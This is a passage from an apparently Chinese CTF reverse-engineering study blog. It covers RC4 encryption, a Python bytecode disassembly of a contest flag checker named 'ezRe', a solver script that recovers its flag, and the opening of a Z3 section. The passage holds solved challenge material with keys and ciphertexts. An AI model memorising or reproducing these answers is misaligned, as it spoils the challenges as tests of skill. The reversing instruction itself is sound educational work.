s</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_crypt</span>(<span class="hljs-params">s, data</span>):<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    result = <span class="hljs-built_in">bytearray</span>(<span class="hljs-built_in">len</span>(data))  <span class="hljs-comment"># 用于存储加密/解密结果</span><br><br>    <span class="hljs-comment"># 加解密过程</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + s[i]) % <span class="hljs-number">256</span><br>        s[i], s[j] = s[j], s[i]  <span class="hljs-comment"># 交换 s[i] 和 s[j]</span><br>        t = (s[i] + s[j]) % <span class="hljs-number">256</span><br>        result[k] = data[k] ^ s[t]  <span class="hljs-comment"># 进行按位异或操作</span><br><br>    <span class="hljs-keyword">return</span> result  <span class="hljs-comment"># 返回加密/解密后的字节数组</span><br><br><br><span class="hljs-comment"># 示例用法</span><br>key = <span class="hljs-string">b&quot;mysecretkey&quot;</span>  <span class="hljs-comment"># 秘钥</span><br>data = <span class="hljs-built_in">bytearray</span>(<span class="hljs-string">b&quot;Hello, RC4!&quot;</span>)  <span class="hljs-comment"># 加密数据</span><br><br><span class="hljs-comment"># 初始化 RC4 状态</span><br>s = rc4_init(key)<br><br><span class="hljs-comment"># 加密或解密</span><br>encrypted_data = rc4_crypt(s.copy(), data)  <span class="hljs-comment"># 需要传递 s 的副本</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;加密后：&quot;</span>, encrypted_data)<br><br><span class="hljs-comment"># 再次初始化 RC4 状态</span><br>s = rc4_init(key)<br><br><span class="hljs-comment"># 使用相同的状态解密</span><br>decrypted_data = rc4_crypt(s.copy(), encrypted_data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密后：&quot;</span>, decrypted_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="1、-2"><a href="#1、-2" class="headerlink" title="1、"></a>1、</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715257489252-70021488-e008-4052-b81f-5e691514019c.png?x-oss-process=image/format,webp/resize,w_1237,limit_0"></p><h2 id="2、-1"><a href="#2、-1" class="headerlink" title="2、"></a>2、</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1726985624038-95ebd59e-44f5-46cc-bddf-919007a294ac.png"></p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-comment"># 十六进制字符串</span><br>hex_data = <span class="hljs-string">&quot;A71A68ECD82711CC8C9B16155CD2673E82ADCE75D4BC5756C28A52B86BD6CCF8A4BA722FE05715B92411&quot;</span><br><br><span class="hljs-comment"># 将十六进制字符串转换为字节</span><br>ciphertext = binascii.unhexlify(hex_data)<br><br><span class="hljs-comment"># RC4 密钥（假设你知道密钥）</span><br>key = b<span class="hljs-string">&#x27;RC4_1s_4w3s0m3&#x27;</span>  <span class="hljs-comment"># 替换为你的RC4密钥</span><br><br><span class="hljs-comment"># 创建 RC4 解密对象</span><br>cipher = ARC4.<span class="hljs-keyword">new</span>(key)<br><br><span class="hljs-comment"># 解密数据</span><br>plaintext = cipher.decrypt(ciphertext)<br><br><span class="hljs-comment"># 输出解密后的内容</span><br><span class="hljs-built_in">print</span>(plaintext.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure><h1 id="2024省赛初赛复现"><a href="#2024省赛初赛复现" class="headerlink" title="2024省赛初赛复现"></a>2024省赛初赛复现</h1><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><code class="hljs tap">ezRe (Python 3.9)<br>[Code]<br>    File Name: flag_checker.py<br>    Object Name: &lt;module&gt;<br>    Arg Count: 0<br>    Pos Only Arg Count: 0<br>    KW Only Arg Count: 0<br>    Locals: 0<br>    Stack Size: 7<br>    Flags: 0x00000040 (CO_NOFREE)<br>    [Names]<br>        &#x27;base64&#x27;<br>        &#x27;input&#x27;<br>        &#x27;text&#x27;<br>        &#x27;key&#x27;<br>        &#x27;list&#x27;<br>        &#x27;range&#x27;<br>        &#x27;s&#x27;<br>        &#x27;j&#x27;<br>        &#x27;i&#x27;<br>        &#x27;len&#x27;<br>        &#x27;data&#x27;<br>        &#x27;_&#x27;<br>        &#x27;append&#x27;<br>        &#x27;result&#x27;<br>        &#x27;zip&#x27;<br>        &#x27;c&#x27;<br>        &#x27;k&#x27;<br>        &#x27;chr&#x27;<br>        &#x27;ord&#x27;<br>        &#x27;b64encode&#x27;<br>        &#x27;encode&#x27;<br>        &#x27;decode&#x27;<br>        &#x27;enc&#x27;<br>        &#x27;print&#x27;<br>    [Var Names]<br>    [Free Vars]<br>    [Cell Vars]<br>    [Constants]<br>        0<br>        None<br>        &#x27;Flag: &#x27;<br>        &#x27;7e021a7dd49e4bd0837e22129682551b&#x27;<br>        [Code]<br>            File Name: flag_checker.py<br>            Object Name: &lt;listcomp&gt;<br>            Arg Count: 1<br>            Pos Only Arg Count: 0<br>            KW Only Arg Count: 0<br>            Locals: 2<br>            Stack Size: 4<br>            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)<br>            [Names]<br>                &#x27;ord&#x27;<br>            [Var Names]<br>                &#x27;.0&#x27;<br>                &#x27;i&#x27;<br>            [Free Vars]<br>            [Cell Vars]<br>            [Constants]<br>                102<br>            [Disassembly]<br>               <span class="hljs-number"> 0 </span>      BUILD_LIST                      0<br>               <span class="hljs-number"> 2 </span>      LOAD_FAST                       0: .0<br>               <span class="hljs-number"> 4 </span>      FOR_ITER                       <span class="hljs-number"> 16 </span>(to 22)<br>               <span class="hljs-number"> 6 </span>      STORE_FAST                      1: i<br>               <span class="hljs-number"> 8 </span>      LOAD_GLOBAL                     0: ord<br>               <span class="hljs-number"> 10 </span>     LOAD_FAST                       1: i<br>               <span class="hljs-number"> 12 </span>     CALL_FUNCTION                   1<br>               <span class="hljs-number"> 14 </span>     LOAD_CONST                      0: 102<br>               <span class="hljs-number"> 16 </span>     BINARY_XOR                      <br>               <span class="hljs-number"> 18 </span>     LIST_APPEND                     2<br>               <span class="hljs-number"> 20 </span>     JUMP_ABSOLUTE                   4<br>               <span class="hljs-number"> 22 </span>     RETURN_VALUE                    <br>        &#x27;&lt;listcomp&gt;&#x27;<br>        256<br>        50<br>        1<br>        &#x27;&#x27;<br>        51<br>        &#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;<br>        &#x27;yes!&#x27;<br>        &#x27;try again...&#x27;<br>    [Disassembly]<br>       <span class="hljs-number"> 0 </span>      LOAD_CONST                      0: 0<br>       <span class="hljs-number"> 2 </span>      LOAD_CONST                      1: None<br>       <span class="hljs-number"> 4 </span>      JUMP_FORWARD                   <span class="hljs-number"> 0 </span>(to 6)<br>       <span class="hljs-number"> 6 </span>      JUMP_FORWARD                   <span class="hljs-number"> 0 </span>(to 8)<br>       <span class="hljs-number"> 8 </span>      JUMP_FORWARD                   <span class="hljs-number"> 0 </span>(to 10)<br>       <span class="hljs-number"> 10 </span>     IMPORT_NAME                     0: base64<br>       <span class="hljs-number"> 12 </span>     STORE_NAME                      0: base64<br>       <span class="hljs-number"> 14 </span>     LOAD_NAME                       1: input<br>       <span class="hljs-number"> 16 </span>     LOAD_CONST                      2: &#x27;Flag: &#x27;<br>       <span class="hljs-number"> 18 </span>     CALL_FUNCTION                   1<br>       <span class="hljs-number"> 20 </span>     STORE_NAME                      2: text<br>       <span class="hljs-number"> 22 </span>     LOAD_CONST                      3: &#x27;7e021a7dd49e4bd0837e22129682551b&#x27;<br>       <span class="hljs-number"> 24 </span>     STORE_NAME                      3: key<br>       <span class="hljs-number"> 26 </span>     LOAD_CONST                      4: &lt;CODE&gt; &lt;listcomp&gt;<br>       <span class="hljs-number"> 28 </span>     LOAD_CONST                      5: &#x27;&lt;listcomp&gt;&#x27;<br>       <span class="hljs-number"> 30 </span>     MAKE_FUNCTION                   0<br>       <span class="hljs-number"> 32 </span>     LOAD_NAME                       3: key<br>       <span class="hljs-number"> 34 </span>     GET_ITER                        <br>       <span class="hljs-number"> 36 </span>     CALL_FUNCTION                   1<br>       <span class="hljs-number"> 38 </span>     STORE_NAME                      3: key<br>       <span class="hljs-number"> 40 </span>     LOAD_NAME                       4: list<br>       <span class="hljs-number"> 42 </span>     LOAD_NAME                       5: range<br>       <span class="hljs-number"> 44 </span>     LOAD_CONST                      6: 256<br>       <span class="hljs-number"> 46 </span>     CALL_FUNCTION                   1<br>       <span class="hljs-number"> 48 </span>     CALL_FUNCTION                   1<br>       <span class="hljs-number"> 50 </span>     STORE_NAME                      6: s<br>       <span class="hljs-number"> 52 </span>     LOAD_CONST                      0: 0<br>       <span class="hljs-number"> 54 </span>     STORE_NAME                      7: j<br>       <span class="hljs-number"> 56 </span>     LOAD_NAME                       5: range<br>       <span class="hljs-number"> 58 </span>     LOAD_CONST                      6: 256<br>       <span class="hljs-number"> 60 </span>     CALL_FUNCTION                   1<br>       <span class="hljs-number"> 62 </span>     GET_ITER                        <br>       <span class="hljs-number"> 64 </span>     FOR_ITER                       <span class="hljs-number"> 62 </span>(to 128)<br>       <span class="hljs-number"> 66 </span>     STORE_NAME                      8: i<br>       <span class="hljs-number"> 68 </span>     LOAD_NAME                       7: j<br>       <span class="hljs-number"> 70 </span>     LOAD_NAME                       6: s<br>       <span class="hljs-number"> 72 </span>     LOAD_NAME                       8: i<br>       <span class="hljs-number"> 74 </span>     BINARY_SUBSCR                   <br>       <span class="hljs-number"> 76 </span>     BINARY_ADD                      <br>       <span class="hljs-number"> 78 </span>     LOAD_NAME                       3: key<br>       <span class="hljs-number"> 80 </span>     LOAD_NAME                       8: i<br>       <span class="hljs-number"> 82 </span>     LOAD_NAME                       9: len<br>       <span class="hljs-number"> 84 </span>     LOAD_NAME                       3: key<br>       <span class="hljs-number"> 86 </span>     CALL_FUNCTION                   1<br>       <span class="hljs-number"> 88 </span>     BINARY_MODULO                   <br>       <span class="hljs-number"> 90 </span>     BINARY_SUBSCR                   <br>       <span class="hljs-number"> 92 </span>     BINARY_ADD                      <br>       <span class="hljs-number"> 94 </span>     LOAD_CONST                      6: 256<br>       <span class="hljs-number"> 96 </span>     BINARY_MODULO                   <br>       <span class="hljs-number"> 98 </span>     STORE_NAME                      7: j<br>       <span class="hljs-number"> 100 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 102 </span>    LOAD_NAME                       7: j<br>       <span class="hljs-number"> 104 </span>    BINARY_SUBSCR                   <br>       <span class="hljs-number"> 106 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 108 </span>    LOAD_NAME                       8: i<br>       <span class="hljs-number"> 110 </span>    BINARY_SUBSCR                   <br>       <span class="hljs-number"> 112 </span>    ROT_TWO                         <br>       <span class="hljs-number"> 114 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 116 </span>    LOAD_NAME                       8: i<br>       <span class="hljs-number"> 118 </span>    STORE_SUBSCR                    <br>       <span class="hljs-number"> 120 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 122 </span>    LOAD_NAME                       7: j<br>       <span class="hljs-number"> 124 </span>    STORE_SUBSCR                    <br>       <span class="hljs-number"> 126 </span>    JUMP_ABSOLUTE                   64<br>       <span class="hljs-number"> 128 </span>    LOAD_CONST                      0: 0<br>       <span class="hljs-number"> 130 </span>    DUP_TOP                         <br>       <span class="hljs-number"> 132 </span>    STORE_NAME                      8: i<br>       <span class="hljs-number"> 134 </span>    STORE_NAME                      7: j<br>       <span class="hljs-number"> 136 </span>    BUILD_LIST                      0<br>       <span class="hljs-number"> 138 </span>    STORE_NAME                      10: data<br>       <span class="hljs-number"> 140 </span>    LOAD_NAME                       5: range<br>       <span class="hljs-number"> 142 </span>    LOAD_CONST                      7: 50<br>       <span class="hljs-number"> 144 </span>    CALL_FUNCTION                   1<br>       <span class="hljs-number"> 146 </span>    GET_ITER                        <br>       <span class="hljs-number"> 148 </span>    FOR_ITER                       <span class="hljs-number"> 88 </span>(to 238)<br>       <span class="hljs-number"> 150 </span>    STORE_NAME                      11: _<br>       <span class="hljs-number"> 152 </span>    LOAD_NAME                       8: i<br>       <span class="hljs-number"> 154 </span>    LOAD_CONST                      8: 1<br>       <span class="hljs-number"> 156 </span>    BINARY_ADD                      <br>       <span class="hljs-number"> 158 </span>    LOAD_CONST                      6: 256<br>       <span class="hljs-number"> 160 </span>    BINARY_MODULO                   <br>       <span class="hljs-number"> 162 </span>    STORE_NAME                      8: i<br>       <span class="hljs-number"> 164 </span>    LOAD_NAME                       7: j<br>       <span class="hljs-number"> 166 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 168 </span>    LOAD_NAME                       8: i<br>       <span class="hljs-number"> 170 </span>    BINARY_SUBSCR                   <br>       <span class="hljs-number"> 172 </span>    BINARY_ADD                      <br>       <span class="hljs-number"> 174 </span>    LOAD_CONST                      6: 256<br>       <span class="hljs-number"> 176 </span>    BINARY_MODULO                   <br>       <span class="hljs-number"> 178 </span>    STORE_NAME                      7: j<br>       <span class="hljs-number"> 180 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 182 </span>    LOAD_NAME                       7: j<br>       <span class="hljs-number"> 184 </span>    BINARY_SUBSCR                   <br>       <span class="hljs-number"> 186 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 188 </span>    LOAD_NAME                       8: i<br>       <span class="hljs-number"> 190 </span>    BINARY_SUBSCR                   <br>       <span class="hljs-number"> 192 </span>    ROT_TWO                         <br>       <span class="hljs-number"> 194 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 196 </span>    LOAD_NAME                       8: i<br>       <span class="hljs-number"> 198 </span>    STORE_SUBSCR                    <br>       <span class="hljs-number"> 200 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 202 </span>    LOAD_NAME                       7: j<br>       <span class="hljs-number"> 204 </span>    STORE_SUBSCR                    <br>       <span class="hljs-number"> 206 </span>    LOAD_NAME                       10: data<br>       <span class="hljs-number"> 208 </span>    LOAD_METHOD                     12: append<br>       <span class="hljs-number"> 210 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 212 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 214 </span>    LOAD_NAME                       8: i<br>       <span class="hljs-number"> 216 </span>    BINARY_SUBSCR                   <br>       <span class="hljs-number"> 218 </span>    LOAD_NAME                       6: s<br>       <span class="hljs-number"> 220 </span>    LOAD_NAME                       7: j<br>       <span class="hljs-number"> 222 </span>    BINARY_SUBSCR                   <br>       <span class="hljs-number"> 224 </span>    BINARY_ADD                      <br>       <span class="hljs-number"> 226 </span>    LOAD_CONST                      6: 256<br>       <span class="hljs-number"> 228 </span>    BINARY_MODULO                   <br>       <span class="hljs-number"> 230 </span>    BINARY_SUBSCR                   <br>       <span class="hljs-number"> 232 </span>    CALL_METHOD                     1<br>       <span class="hljs-number"> 234 </span>    POP_TOP                         <br>       <span class="hljs-number"> 236 </span>    JUMP_ABSOLUTE                   148<br>       <span class="hljs-number"> 238 </span>    LOAD_CONST                      9: &#x27;&#x27;<br>       <span class="hljs-number"> 240 </span>    STORE_NAME                      13: result<br>       <span class="hljs-number"> 242 </span>    LOAD_NAME                       14: zip<br>       <span class="hljs-number"> 244 </span>    LOAD_NAME                       2: text<br>       <span class="hljs-number"> 246 </span>    LOAD_NAME                       10: data<br>       <span class="hljs-number"> 248 </span>    CALL_FUNCTION                   2<br>       <span class="hljs-number"> 250 </span>    GET_ITER                        <br>       <span class="hljs-number"> 252 </span>    FOR_ITER                       <span class="hljs-number"> 32 </span>(to 286)<br>       <span class="hljs-number"> 254 </span>    UNPACK_SEQUENCE                 2<br>       <span class="hljs-number"> 256 </span>    STORE_NAME                      15: c<br>       <span class="hljs-number"> 258 </span>    STORE_NAME                      16: k<br>       <span class="hljs-number"> 260 </span>    LOAD_NAME                       13: result<br>       <span class="hljs-number"> 262 </span>    LOAD_NAME                       17: chr<br>       <span class="hljs-number"> 264 </span>    LOAD_NAME                       18: ord<br>       <span class="hljs-number"> 266 </span>    LOAD_NAME                       15: c<br>       <span class="hljs-number"> 268 </span>    CALL_FUNCTION                   1<br>       <span class="hljs-number"> 270 </span>    LOAD_NAME                       16: k<br>       <span class="hljs-number"> 272 </span>    BINARY_XOR                      <br>       <span class="hljs-number"> 274 </span>    LOAD_CONST                      10: 51<br>       <span class="hljs-number"> 276 </span>    BINARY_XOR                      <br>       <span class="hljs-number"> 278 </span>    CALL_FUNCTION                   1<br>       <span class="hljs-number"> 280 </span>    INPLACE_ADD                     <br>       <span class="hljs-number"> 282 </span>    STORE_NAME                      13: result<br>       <span class="hljs-number"> 284 </span>    JUMP_ABSOLUTE                   252<br>       <span class="hljs-number"> 286 </span>    LOAD_NAME                       0: base64<br>       <span class="hljs-number"> 288 </span>    LOAD_METHOD                     19: b64encode<br>       <span class="hljs-number"> 290 </span>    LOAD_NAME                       13: result<br>       <span class="hljs-number"> 292 </span>    LOAD_METHOD                     20: encode<br>       <span class="hljs-number"> 294 </span>    CALL_METHOD                     0<br>       <span class="hljs-number"> 296 </span>    CALL_METHOD                     1<br>       <span class="hljs-number"> 298 </span>    LOAD_METHOD                     21: decode<br>       <span class="hljs-number"> 300 </span>    CALL_METHOD                     0<br>       <span class="hljs-number"> 302 </span>    STORE_NAME                      22: enc<br>       <span class="hljs-number"> 304 </span>    LOAD_NAME                       22: enc<br>       <span class="hljs-number"> 306 </span>    LOAD_CONST                      11: &#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;<br>       <span class="hljs-number"> 308 </span>    COMPARE_OP                     <span class="hljs-number"> 2 </span>(==)<br>       <span class="hljs-number"> 310 </span>    POP_JUMP_IF_FALSE               324<br>       <span class="hljs-number"> 314 </span>    LOAD_NAME                       23: print<br>       <span class="hljs-number"> 316 </span>    LOAD_CONST                      12: &#x27;yes!&#x27;<br>       <span class="hljs-number"> 318 </span>    CALL_FUNCTION                   1<br>       <span class="hljs-number"> 320 </span>    POP_TOP                         <br>       <span class="hljs-number"> 322 </span>    JUMP_FORWARD                   <span class="hljs-number"> 8 </span>(to 332)<br>       <span class="hljs-number"> 324 </span>    LOAD_NAME                       23: print<br>       <span class="hljs-number"> 326 </span>    LOAD_CONST                      13: &#x27;try again...&#x27;<br>       <span class="hljs-number"> 328 </span>    CALL_FUNCTION                   1<br>       <span class="hljs-number"> 330 </span>    POP_TOP                         <br>       <span class="hljs-number"> 332 </span>    LOAD_CONST                      1: None<br>       <span class="hljs-number"> 334 </span>    RETURN_VALUE<br></code></pre></td></tr></table></figure><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs prolog">import base64<br><br># 原始密钥和加密的目标输出<br>key = <span class="hljs-string">&#x27;7e021a7dd49e4bd0837e22129682551b&#x27;</span><br>encoded_target = <span class="hljs-string">&#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;</span><br><br># 处理密钥<br>processed_key = [ord(i) ^ <span class="hljs-number">102</span> for i in key]<br><br># <span class="hljs-symbol">RC4</span> 类似的流密码算法构建<br>s = list(range(<span class="hljs-number">256</span>))<br>j = <span class="hljs-number">0</span><br>for i in range(<span class="hljs-number">256</span>):<br>    j = (j + s[i] + processed_key[i <span class="hljs-comment">% len(processed_key)]) % 256</span><br>    s[i], s[j] = s[j], s[i]<br><br># 生成数据流 <span class="hljs-string">`data`</span><br>i = j = <span class="hljs-number">0</span><br>data = []<br>for <span class="hljs-symbol">_</span> in range(<span class="hljs-number">50</span>):  # 生成<span class="hljs-number">50</span>个密钥流字节<br>    i = (i + <span class="hljs-number">1</span>) <span class="hljs-comment">% 256</span><br>    j = (j + s[i]) <span class="hljs-comment">% 256</span><br>    s[i], s[j] = s[j], s[i]<br>    data.append(s[(s[i] + s[j]) <span class="hljs-comment">% 256])</span><br><br># 解码 <span class="hljs-string">`encoded_target`</span> 并转换为原始字符串<br>target_bytes = base64.b64decode(encoded_target).decode()<br>decoded_text = <span class="hljs-string">&#x27;&#x27;</span><br><br># 使用 <span class="hljs-string">`data`</span> 对 <span class="hljs-string">`target_bytes`</span> 进行解码<br>for c, k in zip(target_bytes, data):<br>    decoded_text += chr((ord(c) ^ k) ^ <span class="hljs-number">51</span>)<br><br>print(<span class="hljs-string">&quot;Decoded text (flag):&quot;</span>, decoded_text)<br></code></pre></td></tr></table></figure><h1 id="Z3逆向"><a href="#Z3逆向" class="headerlink" title="Z3逆向"></a>Z3逆向</h1><h1 id="了解"><a href="#了解" class="headerlink" title="了解"></a>了解</h1><p><a href="https://www.freebuf.com/articles/web/232002.html">https://www.freebuf.com/articles/web/232002.html</a></p><h1 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h1><h2 id="1、login"><a href="#1、login" class="headerlink" title="1、login"></a>1、login</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721790096751-21fcbb1c-4754-4223-8446-6f575e67948a.png"></p><p>先进行正常的py逆向，得到python文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-comment"># Version: Python 3.6</span><br><br><span class="hljs-attribute">import</span> sys<br><span 